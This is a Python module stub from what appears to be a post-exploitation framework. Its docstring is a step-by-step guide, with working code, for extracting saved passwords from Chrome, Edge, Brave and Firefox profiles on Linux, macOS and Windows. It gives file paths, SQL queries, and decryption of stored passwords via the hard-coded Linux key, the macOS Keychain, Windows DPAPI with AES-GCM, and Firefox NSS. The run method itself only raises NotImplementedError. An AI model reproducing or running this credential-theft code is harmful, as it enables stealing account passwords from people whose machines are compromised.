"""STUB — Browser credential extraction.

Extracts saved login credentials from Chromium-based browsers and Firefox.

──────────────────────────────────────────────────────────────────────────────
IMPLEMENTATION GUIDE
──────────────────────────────────────────────────────────────────────────────

CHROMIUM-BASED BROWSERS (Chrome, Edge, Brave, Opera, Vivaldi)
--------------------------------------------------------------
All store credentials in an SQLite database called "Login Data".

Locate the profile directory:
  Linux  : ~/.config/google-chrome/Default/Login Data
           ~/.config/chromium/Default/Login Data
           ~/.config/microsoft-edge/Default/Login Data
  macOS  : ~/Library/Application Support/Google/Chrome/Default/Login Data
  Windows: %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data

The browser locks this file while running.  Copy it first:
  import shutil, tempfile
  tmp = shutil.copy(login_data_path, tempfile.mktemp(suffix=".db"))

Query credentials:
  import sqlite3
  conn = sqlite3.connect(tmp)
  rows = conn.execute(
      "SELECT origin_url, username_value, password_value FROM logins"
  ).fetchall()

Decrypt password_value (a binary blob):

  LINUX — AES-256-CBC with a key derived from the fixed passphrase "peanuts":
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import base64

    kdf = PBKDF2HMAC(algorithm=hashes.SHA1(), length=16,
                     salt=b"saltysalt", iterations=1)
    key = kdf.derive(b"peanuts")

    # Ciphertext starts with b"v10" or b"v11" — strip the first 3 bytes, then:
    ciphertext = password_value[3:]
    iv = b"\\x20" * 16
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()
    # Strip PKCS7 padding
    pad_len = plaintext[-1]
    password = plaintext[:-pad_len].decode("utf-8", errors="replace")

  macOS — same AES-CBC, but the key comes from the macOS Keychain:
    import subprocess
    result = subprocess.run(
        ["security", "find-generic-password", "-wa", "Chrome Safe Storage"],
        capture_output=True, text=True
    )
    chrome_password = result.stdout.strip().encode()
    # Then derive key with PBKDF2 as above, using chrome_password instead of b"peanuts"

  WINDOWS — DPAPI or AES-256-GCM (Chrome 80+):
    Step 1: Read the master encryption key from Local State:
      import json, base64
      local_state_path = os.path.join(os.path.dirname(login_data_path), "..", "Local State")
      with open(local_state_path) as f:
          local_state = json.load(f)
      encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
      encrypted_key = encrypted_key[5:]   # strip "DPAPI" prefix

    Step 2: Decrypt the master key with DPAPI:
      import ctypes
      class DATA_BLOB(ctypes.Structure):
          _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_char))]
      p = ctypes.create_string_buffer(encrypted_key, len(encrypted_key))
      blobin = DATA_BLOB(ctypes.sizeof(p), p)
      blobout = DATA_BLOB()
      ctypes.windll.crypt32.CryptUnprotectData(
          ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout)
      )
      master_key = ctypes.string_at(blobout.pbData, blobout.cbData)

    Step 3: Decrypt each password blob (format: b"v10" + 12-byte nonce + AES-GCM ciphertext):
      from cryptography.hazmat.primitives.ciphers.aead import AESGCM
      nonce = password_value[3:15]
      ciphertext = password_value[15:]
      aesgcm = AESGCM(master_key)
      password = aesgcm.decrypt(nonce, ciphertext, None).decode()

  pip install: cryptography  (pywin32 for Windows DPAPI helpers)


FIREFOX
-------
Credentials live in:
  Linux/macOS : ~/.mozilla/firefox/<profile>/logins.json
  Windows     : %APPDATA%\\Mozilla\\Firefox\\Profiles\\<profile>\\logins.json

logins.json schema (relevant fields):
  hostname, encryptedUsername, encryptedPassword, encType (1 = DES3)

Encryption uses NSS (Mozilla's crypto library):
  Option A — call libnss3.so directly via ctypes:
    import ctypes, ctypes.util
    nss = ctypes.CDLL(ctypes.util.find_library("nss3"))
    nss.NSS_Init(profile_dir.encode())
    # Use PK11SDR_Decrypt to decrypt each base64-encoded blob
    # The decrypted bytes are ASN.1 DER-encoded — extract the octet-string value

  Option B — use firepwd.py (MIT-licensed, ~300 lines):
    https://github.com/lclevy/firepwd
    Handles both the old 3DES-CBC scheme and the newer AES-256-CBC scheme
    introduced in Firefox 75+ (uses key4.db instead of key3.db)

  Option C — call Firefox's own NSS via subprocess with nss tools:
    certutil, pk12util — rarely available without a full NSS install

  pip install: pycryptodome  (for DES3/AES in pure Python without NSS)


OUTPUT FORMAT
-------------
Return a list of dicts, one per credential:
  {
    "browser": "chrome",
    "url": "https://example.com",
    "username": "alice",
    "password": "hunter2",
    "profile": "/home/alice/.config/google-chrome/Default",
  }
"""

from post.base import ModuleResult, PostModule
from post.loader import register


@register
class BrowserCredModule(PostModule):
    NAME = "cred/browser"
    DESCRIPTION = "STUB — Extract saved credentials from Chrome/Firefox browser profiles"
    PLATFORM = ["linux", "darwin", "windows"]
    IMPLEMENTED = False

    def run(self, args: dict | None = None) -> ModuleResult:
        raise NotImplementedError(
            "See post/cred/browser.py docstring for a full implementation guide "
            "(SQLite + AES-CBC/GCM decryption, per-platform key retrieval)."
        )
